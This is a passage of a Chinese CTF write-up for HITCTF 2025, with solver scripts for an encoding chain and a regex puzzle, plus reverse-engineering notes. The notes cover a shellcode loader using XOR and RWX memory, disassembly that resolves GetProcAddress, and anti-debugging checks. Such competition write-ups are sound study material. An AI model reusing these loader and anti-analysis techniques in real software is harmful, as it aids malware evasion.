class="number">26</span>])</span><br><span class="line">      <span class="keyword">elif</span> ch.isupper():</span><br><span class="line">          res.append(up[(up.index(ch) + shift) % <span class="number">26</span>])</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          res.append(ch)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># swapcase -&gt; caesar(-3) -&gt; rot13 -&gt; base64 -&gt; XOR 0x40 -&gt; base64</span></span><br><span class="line">step1 = enc.swapcase()</span><br><span class="line">step2 = caesar(step1, -<span class="number">3</span>)</span><br><span class="line">step3 = codecs.decode(step2, <span class="string">&quot;rot_13&quot;</span>)</span><br><span class="line">step4 = base64.b64decode(step3)</span><br><span class="line">step5 = <span class="built_in">bytes</span>(b ^ <span class="number">0x40</span> <span class="keyword">for</span> b <span class="keyword">in</span> step4) </span><br><span class="line">flag = base64.b64decode(step5).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>HITCTF2025{BasE64_Xor(@)+Base64_SwApCaSe_Rot13_CaEsAr(3)}</p><h3 id="Regex-Beast"><a href="#Regex-Beast" class="headerlink" title="Regex Beast"></a>Regex Beast</h3><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Solver for the regex labyrinth challenge.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The pattern in enc.txt is essentially:</span></span><br><span class="line"><span class="string">/ (?=A)A (?=B)B /</span></span><br><span class="line"><span class="string">where A and B are enormous nested alternations of fixed-length byte strings.</span></span><br><span class="line"><span class="string">Because each lookahead is paired with the exact consuming part, every branch</span></span><br><span class="line"><span class="string">choice is forced to be the same on both sides, leaving a single valid string</span></span><br><span class="line"><span class="string">for each half. Concatenating the two halves yields the flag (a PNG QR code).</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line">text = Path(<span class="string">&quot;enc.txt&quot;</span>).read_text()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    __slots__ = (<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;children&quot;</span>, <span class="string">&quot;lit&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, typ: <span class="built_in">str</span>, children: <span class="type">Optional</span>[<span class="type">List</span>[<span class="string">&quot;Node&quot;</span>]] = <span class="literal">None</span>, lit: <span class="built_in">bytes</span> = <span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.typ = typ</span><br><span class="line">        <span class="variable language_">self</span>.children = children</span><br><span class="line">        <span class="variable language_">self</span>.lit = lit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Parser for the limited regex grammar: (?:...), (?=...), and \xNN literals.</span></span><br><span class="line">idx = <span class="number">1</span>  <span class="comment"># skip leading slash</span></span><br><span class="line">end = <span class="built_in">len</span>(text) - <span class="number">1</span>  <span class="comment"># skip trailing slash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_expr</span>() -&gt; Node:</span><br><span class="line">    terms = [parse_term()]</span><br><span class="line">    <span class="keyword">while</span> idx &lt; end <span class="keyword">and</span> text[idx] == <span class="string">&quot;|&quot;</span>:</span><br><span class="line">        advance(<span class="number">1</span>)</span><br><span class="line">        terms.append(parse_term())</span><br><span class="line">    <span class="keyword">return</span> terms[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(terms) == <span class="number">1</span> <span class="keyword">else</span> Node(<span class="string">&quot;alt&quot;</span>, terms)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_term</span>() -&gt; Node:</span><br><span class="line">    factors: <span class="type">List</span>[Node] = []</span><br><span class="line">    <span class="keyword">while</span> idx &lt; end <span class="keyword">and</span> text[idx] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;)|/&quot;</span>:</span><br><span class="line">        factors.append(parse_factor())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> factors:</span><br><span class="line">        <span class="keyword">return</span> Node(<span class="string">&quot;lit&quot;</span>, lit=<span class="string">b&quot;&quot;</span>)  <span class="comment"># empty</span></span><br><span class="line">    <span class="keyword">return</span> factors[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(factors) == <span class="number">1</span> <span class="keyword">else</span> Node(<span class="string">&quot;seq&quot;</span>, factors)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_factor</span>() -&gt; Node:</span><br><span class="line">    <span class="keyword">if</span> text.startswith(<span class="string">&quot;(?=&quot;</span>, idx):</span><br><span class="line">        advance(<span class="number">3</span>)</span><br><span class="line">        expr = parse_expr()</span><br><span class="line">        expect(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">        advance(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> Node(<span class="string">&quot;look&quot;</span>, [expr])</span><br><span class="line">    <span class="keyword">if</span> text.startswith(<span class="string">&quot;(?:&quot;</span>, idx):</span><br><span class="line">        advance(<span class="number">3</span>)</span><br><span class="line">        expr = parse_expr()</span><br><span class="line">        expect(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">        advance(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> expr  <span class="comment"># non-capturing group</span></span><br><span class="line">    <span class="keyword">if</span> text.startswith(<span class="string">&quot;\\x&quot;</span>, idx):</span><br><span class="line">        start = idx</span><br><span class="line">        <span class="keyword">while</span> text.startswith(<span class="string">&quot;\\x&quot;</span>, idx):</span><br><span class="line">            advance(<span class="number">4</span>)</span><br><span class="line">        seq = text[start:idx]</span><br><span class="line">        data = <span class="built_in">bytes</span>(<span class="built_in">int</span>(seq[i + <span class="number">2</span> : i + <span class="number">4</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(seq), <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">return</span> Node(<span class="string">&quot;lit&quot;</span>, lit=data)</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unexpected token at <span class="subst">&#123;idx&#125;</span>: <span class="subst">&#123;text[idx:idx+<span class="number">10</span>]!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">advance</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> idx</span><br><span class="line">    idx += n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expect</span>(<span class="params">ch: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> text[idx] != ch:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Expected <span class="subst">&#123;ch!r&#125;</span> at <span class="subst">&#123;idx&#125;</span>, found <span class="subst">&#123;text[idx]!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = parse_expr()</span><br><span class="line"><span class="keyword">assert</span> text[idx] == <span class="string">&quot;/&quot;</span> <span class="keyword">and</span> idx == end, <span class="string">&quot;Did not consume full pattern&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Simplify: convert seq(look(X), Y) into logical AND of X and Y.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SNode</span>:</span><br><span class="line">    __slots__ = (<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;children&quot;</span>, <span class="string">&quot;lit&quot;</span>, <span class="string">&quot;length&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        typ: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        children: <span class="type">Optional</span>[<span class="type">List</span>[<span class="string">&quot;SNode&quot;</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        lit: <span class="built_in">bytes</span> = <span class="string">b&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">        length: <span class="built_in">int</span> = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">    </span>):</span><br><span class="line">        <span class="variable language_">self</span>.typ = typ</span><br><span class="line">        <span class="variable language_">self</span>.children = children</span><br><span class="line">        <span class="variable language_">self</span>.lit = lit</span><br><span class="line">        <span class="variable language_">self</span>.length = length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simplify</span>(<span class="params">node: Node</span>) -&gt; SNode:</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;lit&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> SNode(<span class="string">&quot;lit&quot;</span>, lit=node.lit, length=<span class="built_in">len</span>(node.lit))</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;alt&quot;</span>:</span><br><span class="line">        kids = [simplify(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> node.children]</span><br><span class="line">        <span class="keyword">return</span> SNode(<span class="string">&quot;alt&quot;</span>, children=kids, length=kids[<span class="number">0</span>].length)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;seq&quot;</span>:</span><br><span class="line">        a, b = node.children</span><br><span class="line">        <span class="keyword">if</span> a.typ == <span class="string">&quot;look&quot;</span>:</span><br><span class="line">            left = simplify(a.children[<span class="number">0</span>])</span><br><span class="line">            right = simplify(b)</span><br><span class="line">            <span class="keyword">assert</span> left.length == right.length</span><br><span class="line">            <span class="keyword">return</span> SNode(<span class="string">&quot;and&quot;</span>, children=[left, right], length=left.length)</span><br><span class="line">        left = simplify(a)</span><br><span class="line">        right = simplify(b)</span><br><span class="line">        <span class="keyword">return</span> SNode(<span class="string">&quot;seq&quot;</span>, children=[left, right], length=left.length + right.length)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;look&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> simplify(node.children[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown node type: <span class="subst">&#123;node.typ&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simplify_half</span>(<span class="params">seq_node: Node</span>) -&gt; SNode:</span><br><span class="line">    <span class="comment"># each half is seq(look(expr), expr)</span></span><br><span class="line">    <span class="keyword">assert</span> seq_node.typ == <span class="string">&quot;seq&quot;</span> <span class="keyword">and</span> <span class="built_in">len</span>(seq_node.children) == <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> simplify(seq_node)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">left_half = simplify_half(root.children[<span class="number">0</span>])</span><br><span class="line">right_half = simplify_half(root.children[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Language evaluation with memoization and a small safety cap.</span></span><br><span class="line">LIMIT = <span class="number">20000</span>  <span class="comment"># sanity cap; actual sets stay size 1.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@lru_cache(<span class="params"><span class="literal">None</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language</span>(<span class="params">node: SNode</span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bytes</span>, ...]:</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;lit&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> (node.lit,)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;alt&quot;</span>:</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> node.children:</span><br><span class="line">            res.update(language(ch))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt; LIMIT:</span><br><span class="line">                <span class="keyword">raise</span> MemoryError(<span class="string">&quot;Language exploded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(res)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;seq&quot;</span>:</span><br><span class="line">        left = language(node.children[<span class="number">0</span>])</span><br><span class="line">        right = language(node.children[<span class="number">1</span>])</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> left:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> right:</span><br><span class="line">                res.add(a + b)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt; LIMIT:</span><br><span class="line">                    <span class="keyword">raise</span> MemoryError(<span class="string">&quot;Language exploded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(res)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;and&quot;</span>:</span><br><span class="line">        lset = <span class="built_in">set</span>(language(node.children[<span class="number">0</span>]))</span><br><span class="line">        rset = <span class="built_in">set</span>(language(node.children[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(lset &amp; rset)</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown SNode type: <span class="subst">&#123;node.typ&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">left_word = language(left_half)</span><br><span class="line">right_word = language(right_half)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(left_word) == <span class="built_in">len</span>(right_word) == <span class="number">1</span>, <span class="string">&quot;Ambiguous language?&quot;</span></span><br><span class="line"></span><br><span class="line">flag_bytes = left_word[<span class="number">0</span>] + right_word[<span class="number">0</span>]</span><br><span class="line">Path(<span class="string">&quot;flag.png&quot;</span>).write_bytes(flag_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># If OpenCV is available we can decode directly; otherwise just print path.</span></span><br><span class="line">    <span class="keyword">import</span> cv2  <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">    img = cv2.imread(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">    qr = cv2.QRCodeDetector()</span><br><span class="line">    val, _, _ = qr.detectAndDecode(img)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;QR decode:&quot;</span>, val)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag image saved to flag.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062103089.png" alt="image-20251206210359020"></p><p>flag{3ec1998a-efc7-46f9-85e2-0d3a4427260e}</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="AI-assistant"><a href="#AI-assistant" class="headerlink" title="AI assistant"></a>AI assistant</h3><p>这算AI吧没看出来逆向</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062105870.png" alt="709567631754d8671b81531a04889f29"></p><h3 id="Snake1-一血"><a href="#Snake1-一血" class="headerlink" title="Snake1 [一血]"></a>Snake1 [一血]</h3><p>exe没有实际逻辑，真实逻辑在dll</p><p>所有导出开头都调用 seh_antidbg_stub：构造 SEH，故意除零，若异常链被破坏，就 ExitProcess</p><p>Stage1 Loader：用密钥0b882732-HITCTF-2O25-decrypt-key-06b79fe436e0对 1.txt 进行 XOR 解密，然后强行把前 4 字节（首个 dword）覆盖成 C3C3C3C3（相当于一段 ret 滑梯），把内存页权限改成 RWX（可读&#x2F;可写&#x2F;可执行）后调用执行,本质上是个障眼法。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145241590.png" alt="image-20260115145241590"></p><p>Stage2Loader</p><p>用常量表 XOR 解出 key hitctf，再次读取 1.txt，用新 key XOR 解密。</p><p>将缓冲首 4 字节改成 8B E8 33 C0（mov ebp,eax; xor eax,eax），RWX 后跳进解出的 shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145317323.png" alt="image-20260115145317323"></p><p>把 1.txt 解 XOR 得到 shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line">key = b&quot;hitctf&quot;              # Stage2 的解密 key</span><br><span class="line">ct = Path(&quot;1.txt&quot;).read_bytes()</span><br><span class="line">buf = bytearray(b ^ key[i % len(key)] for i, b in enumerate(ct))</span><br><span class="line">buf[:4] = bytes.fromhex(&quot;8b e8 33 c0&quot;)  # 补上入口</span><br><span class="line">Path(&quot;1_stage2.bin&quot;).write_bytes(buf)</span><br></pre></td></tr></table></figure><p>disasm 后发现两段自解码数据：第一段 XOR 出OutputDebugStringA，第二段 XOR 出 flag</p><p>问问ai就知道大概什么逻辑了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">000000ea &lt;.data+0xea&gt;:</span><br><span class="line">  ea:   89 9d 76 01 00 00       mov    DWORD PTR [ebp+0x176],ebx</span><br><span class="line">  f0:   e8 e1 ff ff ff          call   0xd6</span><br><span class="line">  f5:   89 85 6a 01 00 00       mov    DWORD PTR [ebp+0x16a],eax</span><br><span class="line">  fb:   8b d8                   mov    ebx,eax</span><br><span class="line">  fd:   8b 43 3c                mov    eax,DWORD PTR [ebx+0x3c]</span><br><span class="line"> 100:   8b 54 18 78             mov    edx,DWORD PTR [eax+ebx*1+0x78]</span><br><span class="line"> 104:   03 d3                   add    edx,ebx</span><br><span class="line"> 106:   8b 4a 18                mov    ecx,DWORD PTR [edx+0x18]</span><br><span class="line"> 109:   8b 72 20                mov    esi,DWORD PTR [edx+0x20]</span><br><span class="line"> 10c:   03 f3                   add    esi,ebx</span><br><span class="line"> 10e:   49                      dec    ecx</span><br><span class="line"> 10f:   8b 3c 8e                mov    edi,DWORD PTR [esi+ecx*4]</span><br><span class="line"> 112:   03 fb                   add    edi,ebx</span><br><span class="line"> 114:   8b 07                   mov    eax,DWORD PTR [edi]</span><br><span class="line"> 116:   3d 47 65 74 50          cmp    eax,0x50746547</span><br><span class="line"> 11b:   75 f1                   jne    0x10e</span><br><span class="line"> 11d:   8b 47 04                mov    eax,DWORD PTR [edi+0x4]</span><br><span class="line"> 120:   3d 72 6f 63 41          cmp    eax,0x41636f72</span><br><span class="line"> 125:   75 e7                   jne    0x10e</span><br><span class="line"> 127:   8b 72 24                mov    esi,DWORD PTR [edx+0x24]</span><br><span class="line"> 12a:   03 f3                   add    esi,ebx</span><br><span class="line"> 12c:   66 8b 0c 4e             mov    cx,WORD PTR [esi+ecx*2]</span><br><span class="line"> 130:   8b 72 1c                mov    esi,DWORD PTR [edx+0x1c]</span><br><span class="line"> 133:   03 f3                   add    esi,ebx</span><br><span class="line"> 135:   8b 14 8e                mov    edx,DWORD PTR [esi+ecx*4]</span><br><span class="line"> 138:   03 d3                   add    edx,ebx</span><br><span class="line"> 13a:   89 95 6e 01 00 00       mov    DWORD PTR [ebp+0x16e],edx</span><br><span class="line"> 140:   e8 da fe ff ff          call   0x1f</span><br><span class="line"> 145:   50                      push   eax</span><br><span class="line"> 146:   8b 85 6a 01 00 00       mov    eax,DWORD PTR [ebp+0x16a]</span><br><span class="line"> 14c:   50                      push   eax</span><br><span class="line"> 14d:   8b 85 6e 01 00 00       mov    eax,DWORD PTR [ebp+0x16e]</span><br><span class="line"> 153:   ff d0                   call   eax</span><br><span class="line"> 155:   89 85 72 01 00 00       mov    DWORD PTR [ebp+0x172],eax</span><br><span class="line"> 15b:   e8 10 ff ff ff          call   0x70</span><br><span class="line"> 160:   50                      push   eax</span><br><span class="line"> 161:   8b 85 72 01 00 00       mov    eax,DWORD PTR [ebp+0x172]</span><br><span class="line"> 167:   ff d0                   call   eax</span><br><span class="line"> 169:   c3                      ret    </span><br><span class="line"> 16a:   aa                      stos   BYTE PTR es:[edi],al</span><br><span class="line"> 16b:   aa                      stos   BYTE PTR es:[edi],al</span><br><span class="line"> 16c:   aa                      stos   BYTE PTR es:[edi],al</span><br><span class="line"> 16d:   0a bb bb bb 0b cc       or     bh,BYTE PTR [ebx-0x33f44445]</span><br><span class="line"> 173:   cc                      int3   </span><br><span class="line"> 174:   cc                      int3   </span><br><span class="line"> 175:   0c dd                   or     al,0xdd</span><br><span class="line"> 177:   dd dd                   fstp   st(5)</span><br><span class="line"> 179:   0d ff ff ff ff          or     eax,0xffffffff</span><br><span class="line">import struct</span><br><span class="line">code = Path(&quot;1_stage2.bin&quot;).read_bytes()</span><br><span class="line"></span><br><span class="line">key2 = code[0x1ba:0x1ba+0x1e]</span><br><span class="line">enc = b&quot;\xF5\x49\x91\x61\x4E\x3E\x6A\x39\xDD\x26\xA8\x42\x7D\xEC\x1F\x25&quot; \</span><br><span class="line">    b&quot;\x43\x5F\x69\xB7\xF7\xCD\x08\xC7\x6C\xBB\xBB\x3C&quot; </span><br><span class="line">flag = bytes(enc[i] ^ key2[i] for i in range(len(enc)))</span><br><span class="line">print(flag)  </span><br></pre></td></tr></table></figure><p>flag{HITCTF_2025_86053e16bb6f}</p><h3 id="Snake2"><a href="#Snake2" class="headerlink" title="Snake2"></a>Snake2</h3><p>做了懒得写了</p><h3 id="Exception-Key-二血"><a href="#Exception-Key-二血" class="headerlink" title="Exception Key [二血]"></a>Exception Key [二血]</h3><p>三条反调试：</p><ul><li>anti_debug_is_debugger_present：IsDebuggerPresent 检测，命中则退出。</li><li>anti_debug_debugport：调用 NtQueryInformationProcess(ProcessDebugPort)，若有调试端口则退出，否则将 byte_42FF88&#x3D;-1。</li><li>anti_debug_timing：用 QPC 测 200 万次循环耗时，超过 200ms 则退出。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145611239.png" alt="image-20260115145611239"></p><p>主动触发除零异常,dword_42FF8C 置为异常码 0xC0000005,用 word_4213F8[code&amp;1]&#x3D;0x260 通过 _Locimp::_Addfac 写入 unk_42FF90</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145624744.png" alt="image-20260115145624744"></p><p>取自身 EXE 路径并构造命令行 self –child，传给 spawn_child_under_debug 启动一个子进程在调试模式下。 在收到首个 EXCEPTION_DEBUG_EVENT 时，byte_42FF88++（变为 1）。 </p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145638395.png" alt="image-20260115145638395"></p><p>里面做了右旋，affine等处理</p><p>计算 LCG 种子，若 byte_42FF88 !&#x3D; 0 则 seed &#x3D; byte_42FF88 + 0x12345678，否则 seed &#x3D; dword_42FF8C ^ a5。在正常无调试下，byte_42FF88&#x3D;1，得到 seed&#x3D;0x12345679</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 